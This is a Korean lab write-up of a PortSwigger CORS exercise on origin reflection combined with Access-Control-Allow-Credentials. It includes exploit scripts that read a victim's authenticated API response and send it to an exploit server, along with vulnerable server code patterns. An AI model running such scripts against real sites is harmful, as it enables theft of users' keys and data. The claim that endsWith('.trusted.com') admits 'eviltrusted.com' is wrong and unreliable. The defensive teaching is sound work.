# Lab: CORS vulnerability with basic origin reflection

## 개요

- **난이도**: Apprentice
- **주제**: CORS — Origin 헤더 무조건 반영 / `Access-Control-Allow-Credentials: true` / 자격증명 포함 크로스 오리진 읽기
- **링크**: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

## 목표

서버가 `Origin` 헤더 값을 검증 없이 `Access-Control-Allow-Origin` 에 그대로 반영하고, `Access-Control-Allow-Credentials: true` 를 함께 반환하는 취약점을 이용한다. exploit 페이지에서 피해자의 자격증명(세션 쿠키)으로 admin API 를 호출하고 API 키를 탈취한다.

## CORS 기초

### 동일 출처 정책 (Same-Origin Policy, SOP)

```
출처(Origin) = 프로토콜 + 호스트 + 포트

https://example.com:443/page → 출처: https://example.com

SOP 규칙:
  A 페이지의 JS 는 다른 출처(B)의 응답을 읽을 수 없음
  → 요청은 전송되지만 브라우저가 응답 접근을 차단

예시:
  https://attacker.com 의 JS 에서
  https://bank.com/account 를 fetch() 하면
  → 브라우저가 응답 읽기 차단
```

### CORS 란

```
Cross-Origin Resource Sharing

서버가 HTTP 응답 헤더로 "이 출처는 내 응답을 읽어도 된다" 를 선언
→ 브라우저가 SOP 예외를 허용

핵심 헤더:
  Access-Control-Allow-Origin: https://trusted.com
    → 이 출처만 응답 읽기 허용

  Access-Control-Allow-Credentials: true
    → 쿠키/인증 정보 포함 요청도 허용

  Access-Control-Allow-Origin: *
    → 모든 출처 허용 (단, credentials: 'include' 와 함께 사용 불가)
```

### Preflight 요청

```
단순 요청(Simple Request) — Preflight 없음:
  GET, POST (Content-Type: text/plain, form 등)

비단순 요청 — Preflight 필요:
  PUT, DELETE, PATCH
  Content-Type: application/json 등
  커스텀 헤더 포함

Preflight 흐름:
  1. 브라우저 → OPTIONS 요청 전송
     Origin: https://attacker.com
     Access-Control-Request-Method: GET

  2. 서버 → OPTIONS 응답
     Access-Control-Allow-Origin: https://attacker.com
     Access-Control-Allow-Methods: GET

  3. 브라우저 → 실제 요청 전송 (허가된 경우)
```

### 자격증명 포함 CORS

```javascript
// fetch 로 크로스 오리진 + 쿠키 포함 요청
fetch('https://target.com/api/data', {
    credentials: 'include'  // 쿠키 자동 전송
})
.then(r => r.text())
.then(data => console.log(data));

// credentials: 'include' 가 동작하려면 서버 응답에:
// Access-Control-Allow-Origin: https://attacker.com  (구체적 출처, * 불가)
// Access-Control-Allow-Credentials: true              (이 헤더 필수)
// 두 헤더가 모두 있어야 브라우저가 응답 접근 허용
```

## 취약점 분석 — Origin 무조건 반영

### 취약한 서버 동작

```
요청:
  GET /accountDetails HTTP/1.1
  Origin: https://evil.com
  Cookie: session=abc123

응답:
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil.com   ← Origin 을 그대로 반영!
  Access-Control-Allow-Credentials: true
  Content-Type: application/json

  {"username":"admin","apiKey":"secret123"}
```

```
정상적인 서버:
  → 허용된 출처 목록에서 검사 후 반영
  → 또는 고정값 설정

취약한 서버:
  → request.headers.origin 을 그대로 응답에 복사
  → 어떤 출처에서든 자격증명 포함 응답 읽기 가능
```

### 왜 위험한가

```
SOP 가 막으려는 것:
  공격자가 피해자의 쿠키를 이용해 다른 사이트의 응답을 읽는 것

Origin 반영 + Allow-Credentials: true 가 허용하는 것:
  공격자 도메인에서 피해자의 쿠키로 요청을 보내고
  → 서버는 "attacker.com 출처 허용" 이라고 응답
  → 브라우저도 허용 → 응답 내용 접근 가능

결과:
  피해자의 세션 쿠키로 인증된 API 응답을 공격자가 읽음
  → 개인정보, API 키, 민감 데이터 탈취 가능
```

## 공격 방법

### exploit 페이지 코드

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    // 응답(API 키 포함)을 exploit 서버로 전송
    location = 'https://exploit-server.net/log?key=' + this.responseText;
};
req.open('GET', 'https://VULNERABLE.com/accountDetails', true);
req.withCredentials = true;  // 쿠키 포함
req.send();
</script>
```

또는 fetch 방식:

```javascript
fetch('https://VULNERABLE.com/accountDetails', {
    credentials: 'include'
})
.then(r => r.text())
.then(data => {
    location = 'https://exploit-server.net/log?key=' + encodeURIComponent(data);
});
```

### 실행 흐름

```
1. 공격자: exploit 페이지 작성 (위 스크립트)
   exploit-server.net 에 업로드

2. 피해자: exploit 페이지 방문
   (logged in as admin on VULNERABLE.com — 세션 쿠키 보유)

3. 브라우저: CORS 요청 전송
   GET /accountDetails HTTP/1.1
   Host: VULNERABLE.com
   Origin: https://exploit-server.net   ← 브라우저가 자동 설정
   Cookie: session=<피해자 세션>        ← credentials: include

4. VULNERABLE.com 서버:
   Origin 값을 그대로 반영:
   Access-Control-Allow-Origin: https://exploit-server.net
   Access-Control-Allow-Credentials: true
   → 응답 본문: {"apiKey":"secret123"}

5. 브라우저: CORS 허용 확인 → JS 가 응답 접근 가능

6. JS: 응답 텍스트를 exploit 서버로 전송
   location = 'https://exploit-server.net/log?key={"apiKey":"secret123"}'

7. exploit 서버 로그에서 API 키 확인
```

## 이전 섹션(DOM-based)과의 비교

```
[DOM-based XSS — 001~003]
  같은 출처 내에서 postMessage 로 데이터 전달
  → SOP 관계없음 (같은 사이트)
  → 공격자가 직접 타겟 페이지에 JS 실행

[CORS 취약점 — 001 (이번)]
  다른 출처에서 타겟 사이트 API 를 직접 호출
  → 피해자의 쿠키가 브라우저에 의해 자동 전송
  → SOP 를 서버가 스스로 우회 (잘못된 CORS 설정)
  → 응답 내용(인증된 데이터)을 공격자가 읽음

핵심 차이:
  DOM-based: 타겟 사이트의 JS 취약점 이용
  CORS:      타겟 서버의 HTTP 헤더 설정 취약점 이용
```

## 핵심 정리

- `Access-Control-Allow-Origin` 에 `Origin` 헤더를 그대로 반영하면 모든 출처에서 응답을 읽을 수 있다.
- `Access-Control-Allow-Credentials: true` 가 함께 있으면, 피해자의 세션 쿠키로 인증된 응답까지 탈취 가능하다.
- `credentials: 'include'` + `withCredentials: true` 로 브라우저가 쿠키를 자동으로 요청에 포함시킨다.
- **방어**:
  - 허용할 출처를 서버에 하드코딩 (화이트리스트 방식)
  - `Access-Control-Allow-Origin: *` 와 `Access-Control-Allow-Credentials: true` 를 동시에 사용 금지 (브라우저도 이 조합을 거부하지만, 특정 출처 반영 + credentials 조합이 위험)
  - `Origin` 헤더를 그대로 반영하는 패턴 제거

## 배운 점 및 추가 학습

### 1. CORS 요청의 `credentials` 모드

```javascript
// fetch credentials 옵션:
fetch(url, { credentials: 'omit' })    // 쿠키 미포함 (기본값)
fetch(url, { credentials: 'same-origin' }) // 동일 출처만 쿠키 포함
fetch(url, { credentials: 'include' }) // 항상 쿠키 포함 (크로스 오리진도)

// XMLHttpRequest:
req.withCredentials = false;  // 기본값 (쿠키 미포함)
req.withCredentials = true;   // 크로스 오리진도 쿠키 포함
```

### 2. CORS 응답 헤더 종합

```
Access-Control-Allow-Origin: <origin> | *
  → 허용할 출처. * 는 credentials 없을 때만 사용 가능

Access-Control-Allow-Credentials: true
  → 인증 정보(쿠키, Authorization 헤더) 포함 요청 허용

Access-Control-Allow-Methods: GET, POST, PUT
  → 허용할 HTTP 메서드 (Preflight 응답에)

Access-Control-Allow-Headers: Content-Type, Authorization
  → 허용할 요청 헤더 (Preflight 응답에)

Access-Control-Max-Age: 600
  → Preflight 결과 캐시 시간 (초)

Access-Control-Expose-Headers: X-Custom-Header
  → JS 가 접근할 수 있는 응답 헤더 목록
  → 기본적으로 Cache-Control, Content-Type 등 일부만 노출
```

### 3. 취약한 CORS 설정 패턴

```javascript
// 패턴 1: Origin 무조건 반영 (이번 랩)
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});

// 패턴 2: null Origin 허용
// 로컬 파일(file://) 또는 샌드박스 iframe 의 Origin: null
// 'null' 을 허용하면 sandboxed iframe 에서도 공격 가능
res.setHeader('Access-Control-Allow-Origin', 'null');

// 패턴 3: 정규식 우회 가능한 검사
// "evil.com" 을 허용하면 "eviltarget.com" 이 "target.com" 처럼 보일 수 있음
if (origin.endsWith('.trusted.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
}
// → "eviltrusted.com" 도 통과 가능

// 패턴 4: 안전한 화이트리스트 방식
const allowedOrigins = ['https://trusted.com', 'https://partner.com'];
if (allowedOrigins.includes(req.headers.origin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

### 4. CORS vs CSRF 비교

```
[CSRF]
  공격자가 피해자를 이용해 요청을 "전송"
  → 응답 내용은 읽지 못함 (SOP 가 차단)
  → 상태 변경 작업(계정 삭제, 이메일 변경 등) 이 목표

[CORS 취약점]
  공격자가 피해자의 쿠키로 요청하고 "응답을 읽음"
  → 서버가 CORS 허용 → 브라우저가 응답 접근 허용
  → 민감 데이터 탈취가 목표 (API 키, 개인정보 등)

공통점:
  둘 다 피해자의 브라우저가 공격 매개체
  둘 다 피해자가 로그인된 상태에서 세션 쿠키 악용
```
